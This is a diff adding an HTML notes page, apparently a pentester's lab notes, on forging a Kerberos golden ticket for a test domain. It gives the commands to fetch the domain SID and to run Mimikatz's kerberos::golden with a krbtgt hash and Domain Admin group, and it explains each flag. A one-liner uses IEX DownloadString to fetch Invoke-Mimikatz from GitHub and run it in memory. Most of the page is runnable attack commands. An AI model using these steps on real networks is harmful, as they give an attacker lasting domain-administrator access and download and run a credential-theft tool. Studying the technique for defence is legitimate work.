@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Forge Golden Ticket</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Forge Golden Ticket</h1><br /><br /><strong>Github Mimikatz powershell</strong>: <a
+      href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a><br /><br /><strong>1.
+      Retrieve the SID value of the domain</strong><br />we need it to build the Golden Ticket<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;get-ADdomain&nbsp;DANIELE.local<br />PS&gt;&nbsp;wmic&nbsp;useraccount&nbsp;list&nbsp;brief&nbsp;&nbsp;&nbsp;#alternative
+      </div>
+    </div><br /> <a href=""><img src="images/1144-1.png" alt="images/1144-1.png" /></a><br /> <br /><strong>2. Forge the
+      Golden Ticket</strong><br />This command can be executed on any machine<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;.&nbsp;.\Invoke-Mimikatz.ps1&nbsp;&nbsp;&nbsp;#load&nbsp;powershell&nbsp;script<br />PS&gt;&nbsp;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/krbtgt:fde97d36054bc731495f5d88f458a7ce&nbsp;/id:500&nbsp;/groups:512&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/ptt&quot;&#39;
+      </div>
+    </div><br /> <a href=""><img src="images/1144-2.png" alt="images/1144-2.png" /></a><br />
+    <code>kerberos::golden </code>→ Name of the module<br /> <code>/user:Administrator</code> → Username for which the
+    TGT is generated, if we use a revoked/non-existing account is more suspicious <br /> <code>/domain:</code> → Domain
+    FQDN<br /> <em><code>/sid:  → SID of the domain<br /></code></em> <em><code>/krbtgt</code></em><em> </em>→ NT
+    Hash(RC4) of the krbtgt account. Use /aes128 and /aes256 for using AES keys<em><br />
+    </em><em><code>/id:500 /groups:512</code></em><em> </em>→ Optional.<br /> ▪ User RID(default 500)<br /> ▪ Group:
+    <br /> - Domain Admins: 512<br /> - Domain Users: 513<br /> - Schema Admins: 518<br /> - Enterprise Admins:
+    519<br /> - Group Policy Creator Owners: 520<em><br /> </em><em><code>/startoffset:0</code></em> → Optional. When
+    the Ticket is available in minutes(default is 0 that means &quot;right now&quot;) . <br /> ▪ Use negative numbers
+    for a ticket available from past <br /> ▪ Use large number for the future<br /> <code>/endin</code>: → Optional.
+    Ticket lifetime in minutes(default is 10 years). The default setting in Mimikatz is 10 hours==600 minutes<br />
+    <code>/renewmax</code>: → Optional. Ticket lifetime for renewal(default is 10 yeas). The default setting in Mimikatz
+    is 7 days==10080 minutes<br /> <code>/ptt</code> or <code>/ticket</code> →It is not possible use both at the same
+    time<br /> ▪ /ptt inject the ticket in current Powershell process, so it will be readying for use when we try to
+    attempt accessing a service that relies on Kerberos authentication <br /> ▪ /ticket save the ticket to a file for
+    later use. In the example below we have named the folder &quot;goldenTicketFolder&quot;<em><br /> <br />The one line
+      Powershell for it is:<br /></em>
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/krbtgt:fde97d36054bc731495f5d88f458a7ce&nbsp;&nbsp;/id:500&nbsp;/groups:512&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/ticket:goldenTicketFolder&quot;&nbsp;&quot;kerberos::ptt&nbsp;goldenTicketFolder&quot;&#39;
+      </div>
+    </div><br />Initially this PS script should give some error about some “<span style="color:#ff0000;">variables that
+      cannot be retrieved because not been set</span>” but at the end should work<br /><br /><br />
+  </div>
+</body>
+
+</html>
